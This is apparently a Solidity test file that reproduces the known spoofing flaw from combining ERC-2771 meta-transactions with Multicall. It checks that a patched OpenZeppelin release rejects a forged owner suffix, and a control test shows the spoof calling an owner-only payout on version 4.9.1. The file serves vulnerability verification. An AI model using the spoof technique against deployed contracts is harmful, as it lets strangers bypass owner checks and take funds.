// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {ERC2771Context} from "@openzeppelin/contracts/metatx/ERC2771Context.sol";
import {ERC2771Forwarder} from "@openzeppelin/contracts/metatx/ERC2771Forwarder.sol";
import {Multicall} from "@openzeppelin/contracts/utils/Multicall.sol";
import {Context} from "@openzeppelin/contracts/utils/Context.sol";
import {ERC2771Context as OldContext} from "oz491/metatx/ERC2771Context.sol";
import {Multicall as OldMulticall} from "oz491/utils/Multicall.sol";

interface Vm { function sign(uint256, bytes32) external returns (uint8, bytes32, bytes32); function addr(uint256) external returns (address); }

contract Treasury is ERC2771Context, Multicall {
    address public owner; uint256 public payouts;
    constructor(address f, address o) ERC2771Context(f) { owner = o; }
    function payout() external { require(_msgSender() == owner, "not owner"); payouts++; }
    function _msgSender() internal view override(Context, ERC2771Context) returns (address) { return ERC2771Context._msgSender(); }
    function _msgData() internal view override(Context, ERC2771Context) returns (bytes calldata) { return ERC2771Context._msgData(); }
    function _contextSuffixLength() internal view override(Context, ERC2771Context) returns (uint256) { return ERC2771Context._contextSuffixLength(); }
}

// Control: OpenZeppelin 4.9.1, before the December 2023 Multicall fix
contract OldTreasury is OldContext, OldMulticall {
    address public owner; uint256 public payouts;
    constructor(address f, address o) OldContext(f) { owner = o; }
    function payout() external { require(_msgSender() == owner, "not owner"); payouts++; }
}
contract AppendingForwarder { // appends the verified signer, as ERC-2771 forwarders do
    function forward(address target, bytes calldata data) external returns (bool ok) { (ok,) = target.call(bytes.concat(data, bytes20(msg.sender))); }
}

contract Proof {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    uint256 constant STRANGER_PK = 0x5743;
    address constant OWNER = address(0xA11CE);
    bytes32 constant REQ_TYPEHASH = keccak256("ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint48 deadline,bytes data)");

    function _innerItem() internal pure returns (bytes[] memory items) {
        items = new bytes[](1);
        items[0] = abi.encodePacked(Treasury.payout.selector, OWNER);
    }
    function _domain(ERC2771Forwarder f) internal view returns (bytes32) {
        (, string memory name, string memory version, uint256 chainId, address vc,,) = f.eip712Domain();
        return keccak256(abi.encode(keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"), keccak256(bytes(name)), keccak256(bytes(version)), chainId, vc));
    }
    function _signed(uint256 pk, ERC2771Forwarder f, address to, bytes memory data) internal returns (ERC2771Forwarder.ForwardRequestData memory req) {
        req.from = vm.addr(pk); req.to = to; req.gas = 300000;
        req.deadline = uint48(block.timestamp + 1 hours); req.data = data;
        bytes32 st = keccak256(abi.encode(REQ_TYPEHASH, req.from, to, 0, 300000, f.nonces(req.from), req.deadline, keccak256(data)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, keccak256(abi.encodePacked("\x19\x01", _domain(f), st)));
        req.signature = abi.encodePacked(r, s, v);
    }
    function testForgedInnerSuffixIgnoredOZ54() public {
        ERC2771Forwarder f = new ERC2771Forwarder("Forwarder");
        Treasury t = new Treasury(address(f), OWNER);
        ERC2771Forwarder.ForwardRequestData memory req = _signed(STRANGER_PK, f, address(t), abi.encodeCall(Multicall.multicall, (_innerItem())));
        (bool ok,) = address(f).call(abi.encodeCall(f.execute, (req)));
        require(!ok, "forwarded multicall succeeded");
        require(t.payouts() == 0, "payout ran");
    }
    // Sanity: the same signing helper works when the owner's own key signs, so the failure above is the owner check.
    function testOwnerSignedMulticallPays() public {
        uint256 ownerPk = 0x0123;
        ERC2771Forwarder f = new ERC2771Forwarder("Forwarder");
        Treasury t = new Treasury(address(f), vm.addr(ownerPk));
        bytes[] memory items = new bytes[](1); items[0] = abi.encodeCall(Treasury.payout, ());
        f.execute(_signed(ownerPk, f, address(t), abi.encodeCall(Multicall.multicall, (items))));
        require(t.payouts() == 1, "owner payout failed");
    }
    // Sanity: the stranger's signature itself is valid for the forwarder.
    function testStrangerRequestVerifies() public {
        ERC2771Forwarder f = new ERC2771Forwarder("Forwarder");
        Treasury t = new Treasury(address(f), OWNER);
        require(f.verify(_signed(STRANGER_PK, f, address(t), abi.encodeCall(Multicall.multicall, (_innerItem())))), "stranger request invalid");
    }
    function testControlOZ491SpoofWorks() public {
        AppendingForwarder f = new AppendingForwarder();
        OldTreasury t = new OldTreasury(address(f), OWNER);
        require(f.forward(address(t), abi.encodeCall(OldMulticall.multicall, (_innerItem()))), "call failed");
        require(t.payouts() == 1, "spoof did not work on 4.9.1");
    }
}
